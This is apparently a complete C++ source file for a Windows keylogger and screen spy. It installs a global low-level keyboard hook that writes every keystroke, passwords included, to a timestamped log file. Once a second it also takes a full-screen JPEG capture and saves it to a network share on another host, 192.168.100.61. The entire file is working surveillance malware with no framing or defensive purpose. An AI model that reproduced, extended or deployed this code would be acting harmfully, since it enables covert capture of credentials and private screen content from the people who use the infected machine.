#include <windows.h>
#include <iostream>
#include <fstream>
#include <chrono>
#include <iomanip>
#include <gdiplus.h>

#define MAX_PATH 260

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
void Save(const char* text);
void CaptureScreenAndSave();

using namespace Gdiplus;

int GetEncoderClsid(const WCHAR* format, CLSID* pClsid);

HHOOK hHook = NULL;
bool newLinePending = false;
bool isNewLine = true;

int main() {
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (hHook == NULL) {
        std::cerr << "Failed to set hook\n";
        return 1;
    }

    UINT_PTR timerId = SetTimer(NULL, 0, 1000, (TIMERPROC)CaptureScreenAndSave);
    if (timerId == 0) {
        std::cerr << "Failed to set up timer\n";
        return 1;
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hHook);
    KillTimer(NULL, timerId);

    return 0;
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        KBDLLHOOKSTRUCT* kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = kbdStruct->vkCode;
        bool isSpecialKey = false;
        char key[16] = { 0 };

        bool shiftPressed = GetAsyncKeyState(VK_SHIFT) & 0x8000;

        if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
            switch (vkCode) {
            case VK_RETURN:
                strcpy_s(key, " &Return\n");
                isSpecialKey = true;
                newLinePending = true;
                break;
            case VK_ESCAPE:
                strcpy_s(key, " &Esc\n");
                isSpecialKey = true;
                newLinePending = true;
                break;
            case VK_SPACE:
                strcpy_s(key, " ");
                isSpecialKey = true;
                break;
            case VK_BACK:
                strcpy_s(key, " &BackSpace\n");
                isSpecialKey = true;
                newLinePending = true;
                break;
            case VK_TAB:
                strcpy_s(key, " &Tab\n");
                isSpecialKey = true;
                newLinePending = true;
                break;
            case VK_DELETE:
                strcpy_s(key, " &Delete\n");
                isSpecialKey = true;
                newLinePending = true;
                break;
            case VK_UP:
                strcpy_s(key, " &Up ");
                isSpecialKey = true;
                break;
            case VK_DOWN:
                strcpy_s(key, " &Down ");
                isSpecialKey = true;
                break;
            case VK_LEFT:
                strcpy_s(key, " &Left ");
                isSpecialKey = true;
                break;
            case VK_RIGHT:
                strcpy_s(key, " &Right ");
                isSpecialKey = true;
                break;
            case VK_PRIOR:
                strcpy_s(key, " &PageUp ");
                isSpecialKey = true;
                break;
            case VK_NEXT:
                strcpy_s(key, " &PageDown ");
                isSpecialKey = true;
                break;
            case VK_HOME:
                strcpy_s(key, " &Home ");
                isSpecialKey = true;
                break;
            case VK_END:
                strcpy_s(key, " &End ");
                isSpecialKey = true;
                break;
            case 0xBA:
                strcpy_s(key, shiftPressed ? ":" : ";");
                isSpecialKey = true;
                break;
            case 0xBB:
                strcpy_s(key, shiftPressed ? "+" : "=");
                isSpecialKey = true;
                break;
            case 0xBC:
                strcpy_s(key, shiftPressed ? "<" : ",");
                isSpecialKey = true;
                break;
            case 0xBD:
                strcpy_s(key, shiftPressed ? "_" : "-");
                isSpecialKey = true;
                break;
            case 0xBE:
                strcpy_s(key, shiftPressed ? ">" : ".");
                isSpecialKey = true;
                break;
            case 0xBF:
                strcpy_s(key, shiftPressed ? "?" : "/");
                isSpecialKey = true;
                break;
            case 0xC0:
                strcpy_s(key, shiftPressed ? "~" : "`");
                isSpecialKey = true;
                break;
            case 0xDB:
                strcpy_s(key, shiftPressed ? "{" : "[");
                isSpecialKey = true;
                break;
            case 0xDC:
                strcpy_s(key, shiftPressed ? "|" : "\\");
                isSpecialKey = true;
                break;
            case 0xDD:
                strcpy_s(key, shiftPressed ? "}" : "]");
                isSpecialKey = true;
                break;
            case 0xDE:
                strcpy_s(key, shiftPressed ? "\"" : "'");
                isSpecialKey = true;
                break;
            default:
                BYTE keyboardState[256];
                GetKeyboardState(keyboardState);

                int result = ToAscii(vkCode, kbdStruct->scanCode, keyboardState, (LPWORD)key, 0);
                if (result == 1 || result == 2) {
                    if (isprint(key[0]) || key[0] == '\t' || key[0] == '\n') {
                        if (shiftPressed) {
                            if (isalpha(key[0]) || ispunct(key[0])) {
                                key[0] = toupper(key[0]);
                            }
                            else if (key[0] == '1') {
                                strcpy_s(key, "!");
                            }
                            else if (key[0] == '2') {
                                strcpy_s(key, "@");
                            }
                            else if (key[0] == '3') {
                                strcpy_s(key, "#");
                            }
                            else if (key[0] == '4') {
                                strcpy_s(key, "$");
                            }
                            else if (key[0] == '5') {
                                strcpy_s(key, "%");
                            }
                            else if (key[0] == '6') {
                                strcpy_s(key, "^");
                            }
                            else if (key[0] == '7') {
                                strcpy_s(key, "&");
                            }
                            else if (key[0] == '8') {
                                strcpy_s(key, "*");
                            }
                            else if (key[0] == '9') {
                                strcpy_s(key, "(");
                            }
                            else if (key[0] == '0') {
                                strcpy_s(key, ")");
                            }
                        }
                    }
                }
                break;
            }
        }

        if (isSpecialKey || key[0] != '\0') {
            Save(key);
        }
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void Save(const char* text) {
    const char* remoteFilePath = "d:\\log.txt";
    HANDLE hFile = CreateFileA(
        remoteFilePath,
        FILE_APPEND_DATA,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile != INVALID_HANDLE_VALUE) {
        if (isNewLine) {
            auto now = std::chrono::system_clock::now();
            std::time_t now_c = std::chrono::system_clock::to_time_t(now);

            std::tm* ptm = std::localtime(&now_c);
            char timestamp[32];
            std::strftime(timestamp, sizeof(timestamp), "[%Y-%m-%d %H:%M:%S] ", ptm);

            std::string logEntry = timestamp + std::string(text);

            DWORD written;
            WriteFile(hFile, logEntry.c_str(), logEntry.size(), &written, NULL);
            isNewLine = false;
        }
        else {
            DWORD written;
            WriteFile(hFile, text, strlen(text), &written, NULL);
        }

        if (newLinePending) {
            isNewLine = true;
            newLinePending = false;
        }

        CloseHandle(hFile);
    }
    else {
        std::cerr << "Failed to open remote file\n";
    }
}

void CaptureScreenAndSave() {
    wchar_t filename[MAX_PATH];

    time_t now = time(nullptr);
    tm localTime;
    localtime_s(&localTime, &now);
    swprintf_s(filename, MAX_PATH, L"\\\\192.168.100.61\\123\\%02d%02d%02d%02d%02d.jpg", localTime.tm_mon + 1, localTime.tm_mday, localTime.tm_hour, localTime.tm_min, localTime.tm_sec);

    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    HWND desktop = GetDesktopWindow();
    HDC desktopdc = GetDC(desktop);
    HDC mydc = CreateCompatibleDC(desktopdc);
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);
    HBITMAP mybmp = CreateCompatibleBitmap(desktopdc, width, height);
    HBITMAP oldbmp = (HBITMAP)SelectObject(mydc, mybmp);
    BitBlt(mydc, 0, 0, width, height, desktopdc, 0, 0, SRCCOPY | CAPTUREBLT);
    SelectObject(mydc, oldbmp);

    bool defaultfn = false;
    wchar_t format[5] = L"jpeg";
    wchar_t encoder[16] = L"image/jpeg";
    long quality = 30;

    Bitmap* b = Bitmap::FromHBITMAP(mybmp, NULL);
    CLSID encoderClsid;
    EncoderParameters encoderParameters;
    Status stat = GenericError;

    wcsncpy_s(encoder + wcslen(L"image/"), 16 - wcslen(L"image/"), format, _TRUNCATE);

    if (b)
    {
        if (GetEncoderClsid(encoder, &encoderClsid) != -1)
        {
            if (quality >= 0 && quality <= 100 && wcscmp(encoder, L"image/jpeg") == 0)
            {
                encoderParameters.Count = 1;
                encoderParameters.Parameter[0].Guid = EncoderQuality;
                encoderParameters.Parameter[0].Type = EncoderParameterValueTypeLong;
                encoderParameters.Parameter[0].NumberOfValues = 1;
                encoderParameters.Parameter[0].Value = &quality;

                stat = b->Save(filename, &encoderClsid, &encoderParameters);
            }
            else
                stat = b->Save(filename, &encoderClsid, NULL);
        }

        delete b;
    }

    GdiplusShutdown(gdiplusToken);
    ReleaseDC(desktop, desktopdc);
    DeleteObject(mybmp);
    DeleteDC(mydc);
    return;
}

int GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
{
    UINT  num = 0;
    UINT  size = 0;

    ImageCodecInfo* pImageCodecInfo = NULL;

    GetImageEncodersSize(&num, &size);
    if (size == 0)
        return -1;

    pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
    if (pImageCodecInfo == NULL)
        return -1;

    GetImageEncoders(num, size, pImageCodecInfo);

    for (UINT j = 0; j < num; ++j)
    {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0)
        {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;
        }
    }

    free(pImageCodecInfo);
    return -1;
}